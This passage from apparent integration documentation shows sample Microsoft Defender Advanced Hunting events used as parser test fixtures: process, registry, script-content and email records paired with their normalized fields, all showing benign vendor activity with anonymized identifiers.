d\\\":\\\"S-1-5-21-1111111111-2222222222-3333333333-2004\\\",\\\"Name\\\":\\\"exampleuser\\\",\\\"DomainName\\\":\\\"MAC-EXAMPLE\\\",\\\"LogonId\\\":0,\\\"PosixUserId\\\":502,\\\"PrimaryPosixGroup\\\":{\\\"Name\\\":\\\"staff\\\",\\\"PosixGroupId\\\":20}},\\\"ProcessPosixEffectiveGroup\\\":{\\\"Name\\\":\\\"staff\\\",\\\"PosixGroupId\\\":20},\\\"ProcessPosixProcessGroupId\\\":7357,\\\"ProcessPosixSessionId\\\":1,\\\"ProcessCurrentWorkingDirectory\\\":\\\"/\\\",\\\"ProcessPosixFilePermissions\\\":[\\\"None\\\"]}\",\"InitiatingProcessVersionInfoCompanyName\":null,\"InitiatingProcessVersionInfoProductName\":null,\"InitiatingProcessVersionInfoProductVersion\":null,\"InitiatingProcessVersionInfoInternalFileName\":null,\"InitiatingProcessVersionInfoOriginalFileName\":null,\"InitiatingProcessVersionInfoFileDescription\":null,\"ProcessVersionInfoCompanyName\":null,\"ProcessVersionInfoProductName\":null,\"ProcessVersionInfoProductVersion\":null,\"ProcessVersionInfoInternalFileName\":null,\"ProcessVersionInfoOriginalFileName\":null,\"ProcessVersionInfoFileDescription\":null,\"InitiatingProcessSessionId\":null,\"CreatedProcessSessionId\":null,\"IsInitiatingProcessRemoteSession\":false,\"InitiatingProcessRemoteSessionDeviceName\":null,\"InitiatingProcessRemoteSessionIP\":null,\"IsProcessRemoteSession\":false,\"ProcessRemoteSessionDeviceName\":null,\"ProcessRemoteSessionIP\":null,\"ProcessUniqueId\":\"0\",\"InitiatingProcessUniqueId\":\"0\",\"ActionType\":\"ProcessCreated\",\"Timestamp\":\"2025-06-23T17:41:30.835162Z\",\"MachineGroup\":\"UnassignedGroup\"},\"Tenant\":\"DefaultTenant\"}",
        "event": {
            "category": [
                "process"
            ],
            "dataset": "device_process_events",
            "type": [
                "info"
            ]
        },
        "@timestamp": "2025-06-23T17:41:30.835162Z",
        "action": {
            "name": "Publish",
            "properties": {
                "AccountSid": "S-1-5-21-1111111111-2222222222-3333333333-2004",
                "InitiatingProcessCommandLine": "xpcproxy com.apple.systemsettingsagent",
                "InitiatingProcessFileSize": 216320,
                "InitiatingProcessLogonId": "0",
                "InitiatingProcessParentFileName": "launchd",
                "IsInitiatingProcessRemoteSession": "false",
                "LogonId": "0"
            },
            "type": "ProcessCreated"
        },
        "agent": {
            "id": "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc"
        },
        "file": {
            "directory": "/System/Applications/System Settings.app/Contents/Resources/systemsettingsagent",
            "hash": {
                "md5": "68b329da9893e34099c7d8ad5cb9c940",
                "sha1": "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc",
                "sha256": "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b"
            },
            "name": "systemsettingsagent",
            "size": 618128
        },
        "host": {
            "id": "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc",
            "name": "example.com",
            "os": {
                "type": "macos"
            }
        },
        "microsoft": {
            "defender": {
                "report": {
                    "id": "10673"
                }
            }
        },
        "process": {
            "args": [
                "Settings.app/Contents/Resources/systemsettingsagent\""
            ],
            "command_line": "\"/System/Applications/System Settings.app/Contents/Resources/systemsettingsagent\"",
            "executable": "/System/Applications/System Settings.app/Contents/Resources/systemsettingsagent",
            "name": "systemsettingsagent",
            "parent": {
                "args": [
                    "com.apple.systemsettingsagent"
                ],
                "code_signature": {
                    "status": "Unknown",
                    "subject_name": "Unknown"
                },
                "command_line": "xpcproxy com.apple.systemsettingsagent",
                "executable": "/usr/libexec/xpcproxy",
                "hash": {
                    "md5": "68b329da9893e34099c7d8ad5cb9c940",
                    "sha1": "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc",
                    "sha256": "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b"
                },
                "name": "xpcproxy",
                "pid": 7357,
                "start": "2025-06-23T17:41:30.835132Z",
                "user": {
                    "domain": "example.com",
                    "id": "S-1-5-18",
                    "name": "root"
                },
                "working_directory": "/usr/libexec"
            },
            "pid": 7357,
            "start": "2025-06-23T17:41:30.835162Z",
            "working_directory": "/System/Applications/System Settings.app/Contents/Resources"
        },
        "related": {
            "hash": [
                "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b",
                "68b329da9893e34099c7d8ad5cb9c940",
                "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc"
            ],
            "user": [
                "user1"
            ]
        },
        "user": {
            "domain": "example.com",
            "name": "user1"
        }
    }
    	
	```


=== "test_device_registry_event2.json"

    ```json
	
    {
        "message": "{\"time\":\"2026-02-09T13:13:00.4781979Z\",\"tenantId\":\"00000000-0000-0000-0000-000000000000\",\"operationName\":\"Publish\",\"category\":\"AdvancedHunting-DeviceRegistryEvents\",\"_TimeReceivedBySvc\":\"2026-02-09T13:12:14.3773992Z\",\"properties\":{\"DeviceName\":\"hostname\",\"DeviceId\":\"1111111111111111111111111111111111111111\",\"ReportId\":43051,\"RegistryKey\":\"HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnce\",\"RegistryValueName\":\"msedge_cleanup_{00000000-0000-0000-0000-000000000000}\",\"RegistryValueType\":\"String\",\"RegistryValueData\":\"\\\"C:\\\\Program Files (x86)\\\\Microsoft\\\\EdgeWebView\\\\Application\\\\144.0.3719.115\\\\Installer\\\\setup.exe\\\" --msedgewebview --delete-old-versions --system-level --verbose-logging --on-logon\",\"PreviousRegistryValueData\":null,\"InitiatingProcessSHA1\":\"adc83b19e793491b1c6ea0fd8b46cd9f32e592fc\",\"InitiatingProcessFileSize\":7771728,\"InitiatingProcessMD5\":\"68b329da9893e34099c7d8ad5cb9c940\",\"InitiatingProcessFileName\":\"setup.exe\",\"InitiatingProcessParentFileName\":\"setup.exe\",\"InitiatingProcessFolderPath\":\"c:\\\\program files (x86)\\\\microsoft\\\\edgewebview\\\\application\\\\144.0.3719.115\\\\installer\\\\setup.exe\",\"InitiatingProcessCommandLine\":\"\\\"setup.exe\\\" --msedgewebview --delete-old-versions --system-level --verbose-logging\",\"InitiatingProcessCreationTime\":\"2026-02-09T12:59:50.3477956Z\",\"InitiatingProcessParentCreationTime\":\"2026-02-09T12:59:07.8025639Z\",\"InitiatingProcessAccountName\":\"syst\u00e8me\",\"InitiatingProcessAccountDomain\":\"system\",\"InitiatingProcessAccountSid\":\"S-1-5-18\",\"InitiatingProcessParentId\":18352,\"InitiatingProcessId\":22028,\"InitiatingProcessIntegrityLevel\":\"System\",\"InitiatingProcessTokenElevation\":\"TokenElevationTypeDefault\",\"PreviousRegistryKey\":\"\",\"PreviousRegistryValueName\":\"msedge_cleanup_{00000000-0000-0000-0000-000000000000}\",\"AppGuardContainerId\":\"\",\"ActionType\":\"RegistryValueSet\",\"InitiatingProcessSHA256\":\"01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b\",\"InitiatingProcessAccountUpn\":null,\"InitiatingProcessAccountObjectId\":null,\"InitiatingProcessVersionInfoCompanyName\":\"Microsoft Corporation\",\"InitiatingProcessVersionInfoProductName\":\"Microsoft Edge Installer\",\"InitiatingProcessVersionInfoProductVersion\":\"144.0.3719.115\",\"InitiatingProcessVersionInfoInternalFileName\":\"setup_exe\",\"InitiatingProcessVersionInfoOriginalFileName\":\"setup.exe\",\"InitiatingProcessVersionInfoFileDescription\":\"Microsoft Edge Installer\",\"InitiatingProcessSessionId\":0,\"IsInitiatingProcessRemoteSession\":false,\"InitiatingProcessRemoteSessionDeviceName\":null,\"InitiatingProcessRemoteSessionIP\":null,\"InitiatingProcessUniqueId\":\"1111111111111111\",\"Timestamp\":\"2026-02-09T13:10:05.872908Z\",\"MachineGroup\":\"UnassignedGroup\"},\"Tenant\":\"DefaultTenant\"}\n",
        "event": {
            "category": [
                "process"
            ],
            "dataset": "device_registry_events",
            "type": [
                "info"
            ]
        },
        "@timestamp": "2026-02-09T13:10:05.872908Z",
        "action": {
            "name": "Publish",
            "properties": {
                "InitiatingProcessCommandLine": "\"setup.exe\" --msedgewebview --delete-old-versions --system-level --verbose-logging",
                "InitiatingProcessFileSize": 7771728,
                "InitiatingProcessIntegrityLevel": "System",
                "InitiatingProcessSessionId": "0",
                "InitiatingProcessTokenElevation": "TokenElevationTypeDefault",
                "InitiatingProcessVersionInfoCompanyName": "Microsoft Corporation",
                "InitiatingProcessVersionInfoFileDescription": "Microsoft Edge Installer",
                "InitiatingProcessVersionInfoInternalFileName": "setup_exe",
                "InitiatingProcessVersionInfoOriginalFileName": "setup.exe",
                "InitiatingProcessVersionInfoProductName": "Microsoft Edge Installer",
                "InitiatingProcessVersionInfoProductVersion": "144.0.3719.115",
                "IsInitiatingProcessRemoteSession": "false",
                "PreviousRegistryValueName": "msedge_cleanup_{00000000-0000-0000-0000-000000000000}"
            },
            "type": "RegistryValueSet"
        },
        "agent": {
            "id": "1111111111111111111111111111111111111111"
        },
        "host": {
            "id": "1111111111111111111111111111111111111111",
            "name": "hostname"
        },
        "microsoft": {
            "defender": {
                "report": {
                    "id": "43051"
                }
            }
        },
        "process": {
            "args": [
                "--delete-old-versions",
                "--msedgewebview",
                "--system-level",
                "--verbose-logging"
            ],
            "command_line": "\"setup.exe\" --msedgewebview --delete-old-versions --system-level --verbose-logging",
            "executable": "c:\\program files (x86)\\microsoft\\edgewebview\\application\\144.0.3719.115\\installer\\setup.exe",
            "hash": {
                "md5": "68b329da9893e34099c7d8ad5cb9c940",
                "sha1": "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc",
                "sha256": "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b"
            },
            "name": "setup.exe",
            "parent": {
                "name": "setup.exe",
                "pid": 18352,
                "start": "2026-02-09T12:59:07.802563Z"
            },
            "pid": 22028,
            "start": "2026-02-09T12:59:50.347795Z",
            "user": {
                "domain": "system",
                "id": "S-1-5-18",
                "name": "syst\u00e8me"
            },
            "working_directory": "c:\\program files (x86)\\microsoft\\edgewebview\\application\\144.0.3719.115\\installer"
        },
        "registry": {
            "data": {
                "strings": "[\"\"C:\\Program Files (x86)\\Microsoft\\EdgeWebView\\Application\\144.0.3719.115\\Installer\\setup.exe\" --msedgewebview --delete-old-versions --system-level --verbose-logging --on-logon\"]",
                "type": "String"
            },
            "key": "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
            "value": "msedge_cleanup_{00000000-0000-0000-0000-000000000000}"
        },
        "related": {
            "hash": [
                "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b",
                "68b329da9893e34099c7d8ad5cb9c940",
                "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc"
            ]
        }
    }
    	
	```


=== "test_device_registry_events.json"

    ```json
	
    {
        "message": "{\"time\":\"2023-01-04T14:37:14.9238631Z\",\"tenantId\":\"11111111-1111-1111-1111-111111111111\",\"operationName\":\"Publish\",\"category\":\"AdvancedHunting-DeviceRegistryEvents\",\"properties\":{\"DeviceId\":\"68b329da9893e34099c7d8ad5cb9c940\",\"DeviceName\":\"example.com\",\"ReportId\":19168,\"Timestamp\":\"2023-01-04T14:35:20.6161937Z\",\"RegistryKey\":\"\",\"RegistryValueName\":null,\"RegistryValueType\":\"None\",\"RegistryValueData\":null,\"PreviousRegistryValueData\":null,\"InitiatingProcessSHA1\":\"adc83b19e793491b1c6ea0fd8b46cd9f32e592fc\",\"InitiatingProcessFileSize\":445440,\"InitiatingProcessMD5\":\"68b329da9893e34099c7d8ad5cb9c940\",\"InitiatingProcessFileName\":\"omadmclient.exe\",\"InitiatingProcessParentFileName\":\"svchost.exe\",\"InitiatingProcessFolderPath\":\"c:\\\\windows\\\\system32\\\\omadmclient.exe\",\"InitiatingProcessCommandLine\":\"\\\"omadmclient.exe\\\" /serverid \\\"33333333-3333-3333-3333-333333333333\\\" /lookuptype 1 /initiator 0\",\"InitiatingProcessCreationTime\":\"2023-03-01T14:34:55.9883418Z\",\"InitiatingProcessParentCreationTime\":\"2023-03-01T09:01:41.8134369Z\",\"InitiatingProcessAccountName\":\"system\",\"InitiatingProcessAccountDomain\":\"example.com\",\"InitiatingProcessAccountSid\":\"user1\",\"InitiatingProcessParentId\":2196,\"InitiatingProcessId\":25072,\"InitiatingProcessIntegrityLevel\":\"System\",\"InitiatingProcessTokenElevation\":\"TokenElevationTypeDefault\",\"PreviousRegistryKey\":\"HKEY_LOCAL_MACHINE\\\\BCD00000000\\\\Objects\\\\{22222222-2222-2222-2222-222222222222}\\\\Elements\",\"PreviousRegistryValueName\":null,\"AppGuardContainerId\":\"\",\"ActionType\":\"RegistryKeyDeleted\",\"InitiatingProcessSHA256\":\"01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b\",\"InitiatingProcessAccountUpn\":null,\"InitiatingProcessAccountObjectId\":null,\"InitiatingProcessVersionInfoCompanyName\":\"Microsoft Corporation\",\"InitiatingProcessVersionInfoProductName\":\"Microsoft\\u00ae Windows\\u00ae Operating System\",\"InitiatingProcessVersionInfoProductVersion\":\"10.0.19041.2193\",\"InitiatingProcessVersionInfoInternalFileName\":\"omadmclient\",\"InitiatingProcessVersionInfoOriginalFileName\":\"omadmclient.exe\",\"InitiatingProcessVersionInfoFileDescription\":\"Host Process for OMA-DM Client\",\"MachineGroup\":\"UnassignedGroup\"},\"Tenant\":\"DefaultTenant\"}",
        "event": {
            "category": [
                "process"
            ],
            "dataset": "device_registry_events",
            "type": [
                "info"
            ]
        },
        "@timestamp": "2023-01-04T14:35:20.616193Z",
        "action": {
            "name": "Publish",
            "properties": {
                "InitiatingProcessCommandLine": "\"omadmclient.exe\" /serverid \"33333333-3333-3333-3333-333333333333\" /lookuptype 1 /initiator 0",
                "InitiatingProcessFileSize": 445440,
                "InitiatingProcessIntegrityLevel": "System",
                "InitiatingProcessTokenElevation": "TokenElevationTypeDefault",
                "InitiatingProcessVersionInfoCompanyName": "Microsoft Corporation",
                "InitiatingProcessVersionInfoFileDescription": "Host Process for OMA-DM Client",
                "InitiatingProcessVersionInfoInternalFileName": "omadmclient",
                "InitiatingProcessVersionInfoOriginalFileName": "omadmclient.exe",
                "InitiatingProcessVersionInfoProductName": "Microsoft\u00ae Windows\u00ae Operating System",
                "InitiatingProcessVersionInfoProductVersion": "10.0.19041.2193",
                "PreviousRegistryKey": "HKEY_LOCAL_MACHINE\\BCD00000000\\Objects\\{22222222-2222-2222-2222-222222222222}\\Elements"
            },
            "type": "RegistryKeyDeleted"
        },
        "agent": {
            "id": "68b329da9893e34099c7d8ad5cb9c940"
        },
        "host": {
            "id": "68b329da9893e34099c7d8ad5cb9c940",
            "name": "example.com"
        },
        "microsoft": {
            "defender": {
                "report": {
                    "id": "19168"
                }
            }
        },
        "process": {
            "args": [
                "\"33333333-3333-3333-3333-333333333333\"",
                "/initiator",
                "/lookuptype",
                "/serverid",
                "0",
                "1"
            ],
            "command_line": "\"omadmclient.exe\" /serverid \"33333333-3333-3333-3333-333333333333\" /lookuptype 1 /initiator 0",
            "executable": "c:\\windows\\system32\\omadmclient.exe",
            "hash": {
                "md5": "68b329da9893e34099c7d8ad5cb9c940",
                "sha1": "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc",
                "sha256": "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b"
            },
            "name": "omadmclient.exe",
            "parent": {
                "name": "svchost.exe",
                "pid": 2196,
                "start": "2023-03-01T09:01:41.813436Z"
            },
            "pid": 25072,
            "start": "2023-03-01T14:34:55.988341Z",
            "user": {
                "domain": "example.com",
                "id": "user1",
                "name": "system"
            },
            "working_directory": "c:\\windows\\system32"
        },
        "related": {
            "hash": [
                "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b",
                "68b329da9893e34099c7d8ad5cb9c940",
                "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc"
            ]
        }
    }
    	
	```


=== "test_devices_events_script_content.json"

    ```json
	
    {
        "message": "{\"time\":\"2024-10-22T15:10:32.7309209Z\",\"tenantId\":\"11111111-1111-1111-1111-111111111111\",\"operationName\":\"Publish\",\"category\":\"AdvancedHunting-DeviceEvents\",\"_TimeReceivedBySvc\":\"2024-10-22T15:09:55.6358865Z\",\"properties\":{\"DeviceId\":\"adc83b19e793491b1c6ea0fd8b46cd9f32e592fc\",\"DeviceName\":\"example.com\",\"ReportId\":67420,\"InitiatingProcessId\":423638,\"InitiatingProcessCreationTime\":\"2024-10-22T15:09:47.165481Z\",\"InitiatingProcessCommandLine\":null,\"InitiatingProcessParentFileName\":null,\"InitiatingProcessParentId\":0,\"InitiatingProcessParentCreationTime\":null,\"InitiatingProcessSHA1\":null,\"InitiatingProcessMD5\":null,\"InitiatingProcessFileName\":null,\"InitiatingProcessFolderPath\":null,\"InitiatingProcessAccountName\":null,\"InitiatingProcessAccountDomain\":null,\"SHA1\":null,\"MD5\":null,\"FileName\":null,\"FolderPath\":null,\"AccountName\":null,\"AccountDomain\":null,\"AdditionalFields\":\"{\\\"ScriptContent\\\":\\\"# sudo python3 open_files.py --ScriptName open_files.py --id log4j_handlersV2 --filter-env LOG4J_FORMAT_MSG_NO_LOOKUPS=true --filter-name \\\\\\\"log4j,LOG4J,spring-core\\\\\\\" --filter-command \\\\\\\"java,javaw\\\\\\\" --manifest-path \\\\\\\"META-INF/maven/org.apache.logging.log4j/log4j-core/pom.properties\\\\\\\" --marker-path /var/opt/microsoft/mdatp/wdavedr/log4jMitigationApplied --collect-dirlist /log4j/core/lookup/JndiLookup.class,log4j-,spring-core-\\\\n# sudo python2 open_files.py --ScriptName open_files.py --id log4j_handlersV2 --filter-env LOG4J_FORMAT_MSG_NO_LOOKUPS=true --filter-name \\\\\\\"log4j,LOG4J,spring-core\\\\\\\" --filter-command \\\\\\\"java,javaw\\\\\\\" --manifest-path \\\\\\\"META-INF/maven/org.apache.logging.log4j/log4j-core/pom.properties\\\\\\\" --marker-path /var/opt/microsoft/mdatp/wdavedr/log4jMitigationApplied --collect-dirlist /log4j/core/lookup/JndiLookup.class,log4j-,spring-core-\\\\n# sudo rm /opt/microsoft/mdatp/resources/cache/log4j_handlersV2.json \\\\n\\\\nfrom genericpath import isdir\\\\nimport os\\\\nimport re\\\\nimport sys\\\\nimport json\\\\nfrom datetime import datetime as dt\\\\nimport zipfile\\\\nimport string\\\\nimport argparse\\\\nimport traceback\\\\nimport functools\\\\nimport itertools\\\\nimport subprocess as sb\\\\n\\\\nMAX_FILE_SIZE = 1024 * 1024  # 1MB\\\\nMANIFEST_OLD_PATH = \\\\\\\"META-INF/MANIFEST.MF\\\\\\\"\\\\n\\\\ndef take(n, l):\\\\n    for i, item in enumerate(l):\\\\n        if i > n:\\\\n            break\\\\n        yield item\\\\n\\\\nclass Jar:\\\\n    def __init__(self, path):\\\\n        self.path = path\\\\n        self._manifest = {}\\\\n        self._dirlist = []\\\\n\\\\n    def _parse_manifest(self, lines):\\\\n        version_indication = \\\\\\\"version=\\\\\\\"\\\\n        version_lines = [line for line in lines if line.startswith(version_indication)]\\\\n\\\\n        if len(version_lines) > 0:\\\\n            version = version_lines[0][len(version_indication):]\\\\n            yield 'Version', version.strip()\\\\n\\\\n        field_names = ['Specification-Version', 'Specification-Title', 'Specification-Vendor', 'Implementation-Version', 'Implementation-Title', 'Implementation-Vendor']\\\\n        for line in lines:\\\\n            if any(line.startswith(field_name) for field_name in field_names):\\\\n                    key, value = line.split(':')\\\\n                    yield key.strip(), value.strip()\\\\n\\\\n    def _open(self):\\\\n        if not zipfile.is_zipfile(self.path):\\\\n            raise ValueError(\\\\\\\"path is not a zip file: {}\\\\\\\".format(self.path))\\\\n        return zipfile.ZipFile(self.path)\\\\n\\\\n    def _read_dirlist(self):\\\\n        with self._open() as zf:\\\\n            filenames = dict(p for p in zf.namelist())\\\\n            return [f for f in filenames if any(r.search(f.lower()) for r in args.dirlist)]\\\\n\\\\n\\\\n\\\\n    def _get_manifest_path(self, zf):\\\\n        for path in [args.manifest_path, MANIFEST_OLD_PATH]:\\\\n            if path in zf.namelist():\\\\n                return path\\\\n\\\\n    def _read_manifest(self, throw_on_error=False):\\\\n        try:\\\\n            with self._open() as zf:\\\\n                manifest_path = self._get_manifest_path(zf)\\\\n                if not manifest_path:\\\\n                    # Not found manifest file\\\\n                    return {}\\\\n\\\\n                manifest_info = zf.getinfo(manifest_path)\\\\n                if manifest_info.file_size > MAX_FILE_SIZE:\\\\n                    raise IOError(\\\\\\\"manifest file is too big\\\\\\\")\\\\n\\\\n                with zf.open(manifest_path) as f:\\\\n                    readline_f = functools.partial(f.readline, MAX_FILE_SIZE)\\\\n                    manifest_lines = list(x.decode().strip() for x in iter(readline_f, b''))\\\\n                    manifest = self._parse_manifest(manifest_lines)\\\\n                    return dict((k, v) for k, v in manifest\\\\n                            if not args.manifest_keys or any(m.search(k.lower()) for m in args.manifest_keys))\\\\n        except:\\\\n            sys.stderr.write(\\\\\\\"error while reading manifest of '{}': {}\\\\\\\\n\\\\\\\".format(self.path, traceback.format_exc()))\\\\n\\\\n            if throw_on_error:\\\\n                raise\\\\n\\\\n            return {}\\\\n\\\\n    def manifest(self, throw_on_error=False):\\\\n        if not self._manifest:\\\\n            self._manifest = self._read_manifest(throw_on_error)\\\\n        return self._\\\"}\",\"InitiatingProcessAccountSid\":null,\"AppGuardContainerId\":null,\"InitiatingProcessSHA256\":null,\"SHA256\":\"01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b\",\"RemoteUrl\":null,\"ProcessCreationTime\":null,\"ProcessTokenElevation\":null,\"ActionType\":\"ScriptContent\",\"FileOriginUrl\":null,\"FileOriginIP\":null,\"InitiatingProcessLogonId\":0,\"AccountSid\":null,\"RemoteDeviceName\":null,\"RegistryKey\":null,\"RegistryValueName\":null,\"RegistryValueData\":null,\"LogonId\":null,\"LocalIP\":null,\"LocalPort\":null,\"RemoteIP\":null,\"RemotePort\":null,\"ProcessId\":null,\"ProcessCommandLine\":null,\"InitiatingProcessAccountUpn\":null,\"InitiatingProcessAccountObjectId\":null,\"FileSize\":null,\"InitiatingProcessFileSize\":null,\"InitiatingProcessVersionInfoCompanyName\":null,\"InitiatingProcessVersionInfoProductName\":null,\"InitiatingProcessVersionInfoProductVersion\":null,\"InitiatingProcessVersionInfoInternalFileName\":null,\"InitiatingProcessVersionInfoOriginalFileName\":null,\"InitiatingProcessVersionInfoFileDescription\":null,\"InitiatingProcessSessionId\":null,\"IsInitiatingProcessRemoteSession\":false,\"InitiatingProcessRemoteSessionDeviceName\":null,\"InitiatingProcessRemoteSessionIP\":null,\"CreatedProcessSessionId\":null,\"IsProcessRemoteSession\":false,\"ProcessRemoteSessionDeviceName\":null,\"ProcessRemoteSessionIP\":null,\"Timestamp\":\"2024-10-22T15:09:47.246794Z\",\"MachineGroup\":\"Linux Servers - remediate threats automatically\"},\"Tenant\":\"DefaultTenant\"}",
        "event": {
            "category": [
                "host"
            ],
            "dataset": "device_events",
            "type": [
                "info"
            ]
        },
        "@timestamp": "2024-10-22T15:09:47.246794Z",
        "action": {
            "name": "Publish",
            "properties": {
                "InitiatingProcessLogonId": "0",
                "IsInitiatingProcessRemoteSession": "false"
            },
            "type": "ScriptContent"
        },
        "agent": {
            "id": "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc"
        },
        "file": {
            "hash": {
                "sha256": "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b"
            }
        },
        "host": {
            "id": "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc",
            "name": "example.com"
        },
        "microsoft": {
            "defender": {
                "report": {
                    "id": "67420"
                }
            }
        },
        "process": {
            "parent": {
                "pid": 0
            },
            "pid": 423638,
            "start": "2024-10-22T15:09:47.165481Z"
        },
        "related": {
            "hash": [
                "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b"
            ]
        }
    }
    	
	```


=== "test_email_attachment_info.json"

    ```json
	
    {
        "message": "{\"time\":\"2024-10-03T11:25:07.5625580Z\",\"tenantId\":\"11111111-1111-1111-1111-111111111111\",\"operationName\":\"Publish\",\"category\":\"AdvancedHunting-EmailAttachmentInfo\",\"_TimeReceivedBySvc\":\"2024-10-03T11:22:47.9147121Z\",\"properties\":{\"ReportId\":\"22222222-2222-2222-2222-222222222222-1047008117853037475-114bd151f8fb0c58642d2170da4ae7d7c57977260ac2cc8905306cab6b2acabc-1\",\"NetworkMessageId\":\"22222222-2222-2222-2222-222222222222\",\"Timestamp\":\"2024-10-03T11:22:47Z\",\"SenderFromAddress\":\"sender@example.com\",\"RecipientEmailAddress\":\"john.doe@example.com\",\"FileName\":\"Outlook-it5xo44r.jpg\",\"FileType\":\"jpeg\",\"SHA256\":\"01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b\",\"RecipientObjectId\":\"ANONYMIZED\",\"SenderObjectId\":\"33333333-3333-3333-3333-333333333333\",\"SenderDisplayName\":\"ANONYMIZED\",\"ThreatNames\":null,\"ThreatTypes\":null,\"DetectionMethods\":null,\"FileSize\":10996},\"Tenant\":\"DefaultTenant\"}",
        "event": {
            "category": [
                "email"
            ],
            "dataset": "email_attachment_info",
            "type": [
                "info"
            ]
        },
        "@timestamp": "2024-10-03T11:22:47Z",
        "action": {
            "name": "Publish",
            "properties": {
                "RecipientObjectId": "ANONYMIZED",
                "SenderDisplayName": "ANONYMIZED",
                "SenderObjectId": "33333333-3333-3333-3333-333333333333"
            }
        },
        "email": {
            "from": {
                "address": [
                    "sender@example.com"
                ]
            },
            "local_id": "22222222-2222-2222-2222-222222222222",
            "to": {
                "address": [
                    "john.doe@example.com"
                ]
            }
        },
        "file": {
            "hash": {
                "sha256": "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b"
            },
            "name": "Outlook-it5xo44r.jpg",
            "size": 10996
        },
        "microsoft": {
            "defender": {
                "report": {
                    "id": "22222222-2222-2222-2222-222222222222-1047008117853037475-114bd151f8fb0c58642d2170da4ae7d7c57977260ac2cc8905306cab6b2acabc-1"
                }
            }
        },
        "related": {
            "hash": [
                "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b"
            ]
        }
    }
    	
	```


=== "test_email_delivered.json"

    ```json
	
    {
        "message": "{\"time\":\"2024-10-28T14:31:34.1371671Z\",\"tenantId\":\"22222222-2222-2222-2222-222222222222\",\"operationName\":\"Publish\",\"category\":\"AdvancedHunting-EmailEvents\",\"_TimeReceivedBySvc\":\"2024-10-28T14:18:40.3469550Z\",\"properties\":{\"ReportId\":\"22222222-2222-2222-2222-222222222222-abcdef1234567890ab-c\",\"NetworkMessageId\":\"11111111-1111-1111-1111-111111111111\",\"InternetMessageId\":\"ANONYMIZED\",\"Timestamp\":\"2024-10-28T14:18:40Z\",\"EmailClusterId\":3162398878,\"SenderIPv4\":\"1.1.1.1\",\"SenderIPv6\":null,\"SenderMailFromAddress\":\"john.doe@company.com\",\"SenderFromAddress\":\"john.doe@company.com\",\"SenderMailFromDomain\":\"company.com\",\"SenderFromDomain\":\"company.com\",\"RecipientEmailAddress\":\"ANONYMIZED\",\"Subject\":\"ANONYMIZED\",\"EmailDirection\":\"Inbound\",\"DeliveryAction\":\"Delivered\",\"DeliveryLocation\":\"Inbox/folder\",\"EmailAction\":null,\"EmailActionPolicy\":null,\"EmailActionPolicyGuid\":null,\"AttachmentCount\":0,\"UrlCount\":0,\"EmailLanguage\":\"en\",\"RecipientObjectId\":\"ANONYMIZED\",\"SenderObjectId\":null,\"SenderDisplayName\":null,\"ThreatNames\":null,\"ThreatTypes\":null,\"DetectionMethods\":null,\"Connectors\":\"Relai SMTP interne\",\"OrgLevelAction\":\"Allow\",\"OrgLevelPolicy\":\"Connection policy\",\"UserLevelAction\":null,\"UserLevelPolicy\":null,\"ConfidenceLevel\":null,\"AdditionalFields\":null,\"AuthenticationDetails\":\"{\\\"SPF\\\":\\\"pass\\\",\\\"DKIM\\\":\\\"none\\\",\\\"DMARC\\\":\\\"pass\\\"}\",\"BulkComplaintLevel\":null},\"Tenant\":\"DefaultTenant\"}",
        "event": {
            "action": "Delivered",
            "category": [
                "connection",
                "email"
            ],
            "dataset": "email_events",
            "type": [
                "allowed",
                "info"
            ]
        },
        "@timestamp": "2024-10-28T14:18:40Z",
        "action": {
            "name": "Publish",
            "properties": {
                "AttachmentCount": 0,
                "AuthenticationDetails": "{\"DKIM\":\"none\",\"DMARC\":\"pass\",\"SPF\":\"pass\"}",
                "Connectors": "Relai SMTP interne",
                "DeliveryAction": "Delivered",
                "DeliveryLocation": "Inbox/folder",
                "EmailClusterId": "3162398878",
                "EmailDirection": "Inbound",
                "EmailLanguage": "en",
                "OrgLevelAction": "Allow",
                "OrgLevelPolicy": "Connection policy",
                "RecipientObjectId": "ANONYMIZED",
                "SenderFromDomain": "company.com",
                "UrlCount": 0
            }
        },
        "email": {
            "direction": "inbound",
            "from": {
                "address": [
                    "john.doe@company.com"
                ]
            },
            "local_id": "11111111-1111-1111-1111-111111111111",
            "message_id": "ANONYMIZED",
            "subject": "ANONYMIZED",
            "to": {
                "address": [
                    "ANONYMIZED"
                ]
            }
        },
        "microsoft": {
            "defender": {
                "email_auth": {
                    "DKIM": "none",
                    "DMARC": "pass",
                    "SPF": "pass"
                },
                "report": {
                    "id": "22222222-2222-2222-2222-222222222222-abcdef1234567890ab-c"
                }
            }
        },
        "related": {
            "ip": [
                "1.1.1.1"
            ]
        },
        "source": {
            "address": "1.1.1.1",
            "ip": "1.1.1.1"
        }
    }
    	
	```


